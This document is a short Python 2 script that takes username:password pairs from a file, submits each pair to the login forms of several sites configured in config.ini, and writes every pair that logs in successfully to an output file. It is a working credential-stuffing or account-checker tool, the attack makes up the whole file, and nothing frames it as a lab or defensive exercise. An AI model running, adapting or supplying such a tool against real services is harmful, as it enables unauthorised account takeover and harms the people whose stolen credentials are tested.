#!/usr/bin/python

import ConfigParser
import mechanize

br = mechanize.Browser()
config = ConfigParser.ConfigParser()
config.read('config.ini')
users = [line.rstrip('\n') for line in open('userlist.txt')]
output = open('output.txt', 'w')

def check(user, section):
    user = user.split(':')
    print 'checking [%s] %s' % (section, user[0])

    br.open(config.get(section, 'url'))
    br.select_form(predicate=lambda f: f.attrs.get('id', None) == config.get(section, 'form_id'))
    br.form[config.get(section, 'username')] = user[0]
    br.form[config.get(section, 'password')] = user[1]
    res = br.submit()

    if config.get(section, 'success_sign') in res.read():
        print '!! success', user[0], user[1], section, '!!'
        output.write('%s %s %s\n' % (section, user[0], user[1]))

def start():
    for user in users:
        for section in config.sections():
            try:
                check(user, section)
            except Exception, e:
                print '#ERR', e

# EXECUTE HERE
start()
output.close()
